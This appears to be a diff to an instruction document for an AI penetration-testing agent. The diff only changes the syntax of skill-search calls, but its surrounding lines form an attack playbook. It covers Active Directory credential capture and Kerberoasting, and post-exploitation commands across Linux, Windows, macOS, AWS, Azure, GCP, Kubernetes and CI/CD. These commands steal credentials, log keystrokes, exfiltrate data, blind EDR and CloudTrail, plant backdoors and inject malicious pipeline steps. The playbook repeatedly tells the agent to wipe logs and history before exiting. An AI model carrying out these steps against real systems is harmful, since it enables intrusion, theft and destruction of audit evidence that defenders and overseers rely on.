@@ -17,31 +17,31 @@ First, determine where you are. Your starting position defines what comes next.
 → `responder -I <interface> -rdwv` — capture NTLMv2 via LLMNR/NBT-NS
 → `mitm6 -d <domain>` — IPv6 DNS poisoning → NTLMv6 relay (works in most environments)
 → `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP>` — AS-REP roasting
-→ Skills: `skill search --tech nmap,responder,network`
+→ Skills: `skill({ action: "search", tech: ["nmap", "responder", "network"] })`
 
 **Domain user (low privilege):**
 → Enumerate AD, map attack paths, look for quick wins
 → `bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC_IP> -c All`
 → `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request` — Kerberoasting
 → `certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP>` — ADCS misconfigurations
-→ Skills: `skill search --tech activedirectory,kerberos,adcs`
+→ Skills: `skill({ action: "search", tech: ["activedirectory", "kerberos", "adcs"] })`
 
 **Local admin on a machine:**
 → Dump credentials, move laterally, re-enumerate from new position
 → `impacket-secretsdump <domain>/<user>:<pass>@<target>`
 → `netexec smb <range> -u <user> -H <hash> --local-auth` — find reused local admin passwords
-→ Skills: `skill search --tech lateralmovement,credential`
+→ Skills: `skill({ action: "search", tech: ["lateralmovement", "credential"] })`
 
 **Shell on a Linux/Unix machine:**
 → Enumerate local privilege escalation paths
 → Run `linpeas.sh` or `linux-smart-enumeration`
 → Check: sudo -l, SUID binaries, cron jobs, NFS shares, writable /etc/passwd
-→ Skills: `skill search --tech linux,privilegeescalation`
+→ Skills: `skill({ action: "search", tech: ["linux", "privilegeescalation"] })`
 
 **Domain Admin already obtained:**
 → Complete objectives, dump domain secrets, document attack path
 → `impacket-secretsdump <domain>/<DA>:<pass>@<DC_IP> -just-dc`
-→ Skills: `skill search --tech persistence`
+→ Skills: `skill({ action: "search", tech: ["persistence"] })`
 
 ## Decision Loop
 
@@ -117,7 +117,7 @@ After gaining a shell on a Linux target, deploy linuxhook for comprehensive post
 - **Exfil:** `linuxhook data_stage --path PATH --password KEY` — stage and encrypt data
 - `linuxhook dns_tunnel_exfil --file PATH --domain DOMAIN` — DNS-based exfiltration
 - `linuxhook cleanup_linux` — ALWAYS run before exiting to clear history, logs, and artifacts
-- Skills: `skill search --tech linux,postexploit,privilegeescalation`
+- Skills: `skill({ action: "search", tech: ["linux", "postexploit", "privilegeescalation"] })`
 
 **Version-based CVE checks (all platforms):**
 After running recon/privesc scans that report software versions (SUID binaries, services, packages), check for version-specific CVEs:
@@ -161,7 +161,7 @@ After gaining root on a Linux target, deploy kernel-level tools for stealth oper
 - `ebpf bpfmap_sniff --duration 60` — monitor BPF map operations for covert inter-process data channels
 - `ebpf ldpreload_sniff --duration 60` — monitor LD_PRELOAD injection and dynamic linker config changes
 - `ebpf futex_sniff --duration 60` — monitor futex WAIT/WAKE for timing-based covert channels
-- Skills: `skill search --tech ebpf,bpf,kernel,evasion`
+- Skills: `skill({ action: "search", tech: ["ebpf", "bpf", "kernel", "evasion"] })`
 
 **Windows post-exploitation (Administrator required, Windows only):**
 After gaining Administrator on a Windows target, deploy userland tools for credential harvesting and stealth operations.
@@ -180,7 +180,7 @@ After gaining Administrator on a Windows target, deploy userland tools for crede
 - `winhook etw_blind` — patch ETW to blind EDR/AV monitoring
 - `winhook defender_exclude --path C:\Tools` — add Windows Defender exclusion path
 - `winhook cleanup_win` — ALWAYS run before exiting to clear event logs and remove artifacts
-- Skills: `skill search --tech windows,postexploit,credential`
+- Skills: `skill({ action: "search", tech: ["windows", "postexploit", "credential"] })`
 
 **macOS post-exploitation (root preferred, macOS only):**
 After gaining access on a macOS target, deploy 46 tools across 8 categories.
@@ -192,7 +192,7 @@ After gaining access on a macOS target, deploy 46 tools across 8 categories.
 - **Monitoring:** `machook keylog_mac --duration 120` — keystroke capture, `machook dtrace_exec --duration 60` — process trace (SIP disabled), `machook dtrace_net --duration 60` — network trace, `machook dtrace_file --duration 60` — file access trace, `machook clipboard_monitor --duration 30` — clipboard monitoring, `machook screen_capture` — screenshot capture
 - **Lateral:** `machook ssh_pivot --target HOST` — SSH lateral movement/tunnels, `machook airdrop_abuse` — AirDrop recon, `machook bonjour_enum` — mDNS service discovery (SSH/HTTP/SMB/VNC), `machook apple_remote_desktop` — ARD/Screen Sharing status
 - **Exfil/Cleanup:** `machook data_stage` — find/stage sensitive files, `machook artifact_enum` — pre-cleanup audit, `machook cleanup_mac` — ALWAYS run before exiting
-- Skills: `skill search --tech macos,postexploit,keychain`
+- Skills: `skill({ action: "search", tech: ["macos", "postexploit", "keychain"] })`
 
 **AWS post-exploitation (after compromising IAM credentials or EC2 instance):**
 After compromising AWS credentials, deploy cloud-native tools for privilege escalation, data exfiltration, and persistence. 82 programs across 7 categories.
@@ -203,7 +203,7 @@ After compromising AWS credentials, deploy cloud-native tools for privilege esca
 - **Lateral (8):** `awshook ssm_exec --instance-id ID --command CMD` — execute on EC2 via SSM, `awshook ecs_exec --cluster C --task T --command CMD` — execute in ECS containers, `awshook cross_account_enum` — enumerate cross-account trust relationships, `awshook vpc_peering_enum` — VPC peering for network pivoting, `awshook transit_gateway_enum` — TGW attachments and cross-account routing, `awshook lightsail_exec` — Lightsail instance execution, `awshook code_exec_lambda --function-name NAME` — direct Lambda invocation, `awshook ssm_session --instance-id ID` — interactive shell/port forwarding via SSM Session Manager
 - **Evasion (11):** `awshook cloudtrail_blind --action stop` — stop/modify/delete CloudTrail, `awshook guardduty_evade --action suspend` — suspend GuardDuty/archive findings/auto-suppress, `awshook config_disable --action stop` — stop AWS Config recorder, `awshook vpc_flow_disable --action delete` — delete VPC Flow Logs, `awshook access_analyzer_suppress --action archive` — archive Access Analyzer findings, `awshook security_hub_suppress --action suppress` — suppress Security Hub findings, `awshook waf_bypass` — enumerate WAF rules/ACLs/IP sets, `awshook dns_firewall_disable` — disassociate DNS Firewall from VPCs, `awshook cloudwatch_tamper --action delete` — delete/reduce retention of CloudWatch log groups, `awshook macie_disable --action suspend` — suspend/disable Amazon Macie sensitive data discovery, `awshook inspector_disable --action disable` — disable Amazon Inspector vulnerability scanning, `awshook s3_logging_disable --action disable_access_log` — disable S3 access logging and object-level CloudTrail data events
 - **Exfil (12):** `awshook s3_dump` — sensitive file discovery and download, `awshook ec2_snapshot --volume-id VOL` — EBS snapshot with cross-account sharing, `awshook rds_dump --db-identifier ID` — RDS snapshot/share/restore, `awshook dynamodb_dump --table-name T` — DynamoDB scan with secret detection, `awshook ebs_direct_read --snapshot-id SNAP` — block-level snapshot read without EC2, `awshook s3_exfil --bucket B --external-account A` — modify bucket policy for external access, `awshook data_stage --source PATH --dest-bucket B` — compress and stage to attacker S3, `awshook cleanup_aws` — ALWAYS run before exiting to remove all CyberStrike resources, `awshook codecommit_dump --repo NAME` — dump CodeCommit repositories with secret file extraction, `awshook ecr_dump --repository NAME` — enumerate ECR repos/images/vulns with auth token for pull, `awshook athena_query --query-string SQL` — query S3 data lakes via Athena SQL, `awshook secrets_bulk_export` — bulk export Secrets Manager + SSM SecureString with S3 staging
-- Skills: `skill search --tech aws,iam,cloud,postexploit`
+- Skills: `skill({ action: "search", tech: ["aws", "iam", "cloud", "postexploit"] })`
 
 **Azure post-exploitation (after compromising Azure credentials or managed identity):**
 After compromising Azure/Entra ID credentials, deploy tools for tenant enumeration, privilege escalation, data extraction, compliance auditing, and identity attacks. 154 programs across 13 categories.
@@ -219,7 +219,7 @@ After compromising Azure/Entra ID credentials, deploy tools for tenant enumerati
 - **Impact (5):** `azurehook resource_hijack` — cryptomining/resource hijack detection, `azurehook data_destroy` — data destruction risk assessment, `azurehook ransomware_sim` — ransomware simulation, `azurehook account_lockout` — account lockout assessment, `azurehook service_disruption` — service disruption assessment
 - **M365 (4):** `azurehook exchange_abuse` — Exchange Online mailbox/rule abuse, `azurehook sharepoint_enum` — SharePoint Online enumeration, `azurehook teams_enum` — Teams enumeration, `azurehook onedrive_access` — OneDrive file access
 - `azurehook cleanup_azure` — ALWAYS run before exiting to remove created resources
-- Skills: `skill search --tech azure,entraid,cloud,postexploit`
+- Skills: `skill({ action: "search", tech: ["azure", "entraid", "cloud", "postexploit"] })`
 
 **GCP post-exploitation (after compromising GCP credentials or service account):**
 After compromising GCP credentials, deploy cloud-native tools for project enumeration, privilege escalation, data exfiltration, and persistence. 33 programs across 7 categories.
@@ -230,12 +230,12 @@ After compromising GCP credentials, deploy cloud-native tools for project enumer
 - **Exfil (6):** `gcphook gcs_dump` — GCS bucket data dump, `gcphook bigquery_dump` — BigQuery dataset extraction, `gcphook compute_snapshot` — disk snapshot for offline analysis, `gcphook pubsub_sniff` — Pub/Sub message interception, `gcphook source_repo_dump` — Cloud Source Repos secret scan, `gcphook dlp_scan` — DLP API sensitive data discovery
 - **Evasion (3):** `gcphook audit_log_tamper` — audit log tampering, `gcphook vpc_flow_tamper` — VPC flow log disable, `gcphook vpc_firewall_modify` — firewall rule modification
 - `gcphook cleanup_gcp` — ALWAYS run before exiting to remove created resources
-- Skills: `skill search --tech gcp,cloud,postexploit`
+- Skills: `skill({ action: "search", tech: ["gcp", "cloud", "postexploit"] })`
 
 **Kubernetes post-exploitation (after compromising pod or kubeconfig):**
 After compromising a Kubernetes pod or obtaining kubeconfig, deploy tools for cluster enumeration, secret extraction, RBAC abuse, and container escape. 20 programs.
 - `kubehook k8s_enum` — namespaces/pods/services/secrets/RBAC/ingress, `kubehook k8s_secrets` — extract/decode Secrets from all namespaces, `kubehook k8s_escape` — container escape (privileged/hostPID/docker socket/SYS_ADMIN), `kubehook k8s_privesc --method bind_admin` — RBAC privesc/SA token theft/ClusterRoleBinding, `kubehook etcd_dump --endpoint ENDPOINT` — direct etcd secret extraction, `kubehook k8s_backdoor --type daemonset --image IMAGE` — DaemonSet/CronJob backdoor, `kubehook k8s_rbac_audit` — deep RBAC analysis (dangerous verbs/wildcards), `kubehook k8s_network_policy` — NetworkPolicy audit (unprotected namespaces), `kubehook helm_secrets` — Helm release secret extraction, `kubehook kubelet_api --target HOST` — kubelet API probe (10250/10255), `kubehook cloud_metadata` — cloud IMDS credential extraction from pods, `kubehook k8s_configmap` — ConfigMap dump with credential scan, `kubehook k8s_admission` — admission controller/webhook audit, `kubehook k8s_pod_security` — Pod Security Standards enforcement audit, `kubehook k8s_service_account` — SA token/JWT analysis with cluster-admin detection, `kubehook k8s_ingress_audit` — Ingress TLS/annotation exploit audit, `kubehook k8s_pv_dump` — PersistentVolume/hostPath/NFS data extraction, `kubehook k8s_events` — event intelligence (failed auth/image pull/OOM), `kubehook k8s_exec --pod POD --cmd CMD` — lateral movement via pod exec, `kubehook cleanup_k8s` — ALWAYS run before exiting
-- Skills: `skill search --tech kubernetes,container,rbac,postexploit`
+- Skills: `skill({ action: "search", tech: ["kubernetes", "container", "rbac", "postexploit"] })`
 
 **CI/CD pipeline attacks (after compromising CI/CD access):**
 After gaining access to CI/CD systems, extract secrets and inject malicious pipeline steps.
@@ -244,7 +244,7 @@ After gaining access to CI/CD systems, extract secrets and inject malicious pipe
 - `cipipe pipeline_inject --repo OWNER/REPO --callback-url URL` — inject malicious steps into CI/CD pipeline
 - `cipipe gitlab_tokens --url GITLAB_URL --project-id ID` — extract GitLab CI/CD variables and runner tokens
 - `cipipe cleanup_ci` — ALWAYS run to remove injected pipeline modifications
-- Skills: `skill search --tech cicd,github-actions,jenkins,gitlab,pipeline`
+- Skills: `skill({ action: "search", tech: ["cicd", "github-actions", "jenkins", "gitlab", "pipeline"] })`
 
 **Internal services:**
 - MSSQL: `netexec mssql <range>` → default creds → xp_cmdshell for RCE
